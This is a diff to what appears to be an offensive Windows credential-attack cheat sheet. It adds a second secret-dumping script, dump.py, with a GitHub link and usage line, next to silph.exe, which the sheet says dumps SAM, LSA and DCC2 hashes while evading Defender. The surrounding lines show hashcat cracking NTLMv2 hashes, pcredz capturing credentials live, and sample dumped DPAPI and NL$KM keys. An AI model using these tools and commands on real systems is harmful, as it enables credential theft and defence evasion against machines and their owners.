@@ -97,11 +97,12 @@ hashcat -m 5600 NTLMv2.txt /usr/share/wordlist/rockyou.txt
 
 ./pcredz -i eth0 -v      # Capture live Interface
 ```
-## 🚈 silph.exe
+## 🚈 silph.exe 🥷 Dump.py
 - This tool will able to bypass and Dump all secrets like Sam hashes,lsa and dcc2 Hashes.
 - Non Detectable by Defender.
 
 Repo link:- [sliph.exe](unknow)
+Repo link:- [dump.py](https://github.com/g3tsyst3m/undertheradar/blob/main/dumpy.py)
 ### Usage:-
 ```bash
 PS C:\Users\Administrator\Desktop> ./silph.exe -dcc2 -lsa -sam
@@ -141,4 +142,7 @@ dpapi_machinekey: 0x0e88ce11d311dxxxxx22ac2708a4d707e00be
 dpapi_userkey: 0x8b68be9ef724xxxxxxxxx3559e10078e36e8ab32
 [*] NL$KM
 NL$KM: 0x8dd28e6754cxxxxxxx953b95b46a2b366
+```
+```bash
+py dump.py    # so simple for only windows 
 ```
